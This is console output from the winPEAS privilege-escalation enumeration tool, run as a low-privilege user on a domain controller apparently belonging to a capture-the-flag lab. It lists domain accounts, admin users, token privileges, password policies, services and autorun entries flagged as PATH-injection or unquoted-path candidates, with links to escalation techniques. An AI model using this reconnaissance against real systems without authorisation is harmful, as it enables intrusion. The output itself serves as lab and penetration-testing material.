                                                                                                                                                             
System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: legacyy
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, Development, Authentication authority asserted identity
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     TIMELAPSE\legacyy
   Idle Time      :     00h:07m:53s:968ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   DC01
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/23/2022 5:33:53 PM
   Logons Count            :   23
   Password Last Set       :   4/5/2022 10:07:40 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 11:40:55 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   thecybergeek
   User Id                 :   1601
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:16:26 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   payl0ad
   User Id                 :   1602
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:16:44 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   legacyy
   User Id                 :   1603
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   4/5/2022 10:08:20 AM
   Logons Count            :   15
   Password Last Set       :   10/23/2021 12:17:10 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   sinfulz
   User Id                 :   1604
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:17:27 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   babywyrm
   User Id                 :   1605
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:17:41 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   svc_deploy
   User Id                 :   3103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   10/25/2021 12:25:53 PM
   Logons Count            :   26
   Password Last Set       :   10/25/2021 12:12:37 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   TRX
   User Id                 :   5101
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   4/5/2022 10:07:53 AM
   Logons Count            :   45
   Password Last Set       :   2/23/2022 6:43:45 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\legacyy : legacyy [AllAccess]
    C:\Users\Public
    C:\Users\svc_deploy
    C:\Users\TRX

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  TIMELAPSE

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: TIMELAPSE
    SID: S-1-5-21-671920749-559770252-3318990721
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                                                                               
  [X] Exception: Access denied 


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                                                
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot                                                                                                                                             
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System                                                                                                                                            
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot                                                                                                                                             
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot                                                                                                                                                
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System                                                                                                                    
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System                                                                                                              
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System                                                                                                                                        
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Cavium, Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot                                                                                                                                             
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Cavium, Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(QLogic Corporation - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                         

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System                                                                                                              
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload                                                                                                                                    
    Alias Manager and Ticket Service
   =================================================================================================                                                         

    @oem3.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem3.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload                                                                                                                         
    @oem3.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================                                                         

    @oem10.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem10.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot                                                                                                                                       
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================                                                         

    @oem8.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem8.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System                                                                                                                                               
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================                                                         

    @oem7.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem7.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System                                                                                                                              
   =================================================================================================

    @oem11.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem11.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot                                                                                                                                    
    vSockets Driver
   =================================================================================================                                                         

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================                                                         

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================                                                         

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System                                                                                                                                            
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\LAPS
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                            
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                               
   at System.Management.ManagementScope.Initialize()                                                                                                         
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                
   at System.Management.ManagementObjectSearcher.Get()                                                                                                       
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()                                                                                                

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: MSVideo8
    Folder: None (PATH Injection)
    File: VfWWDM32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


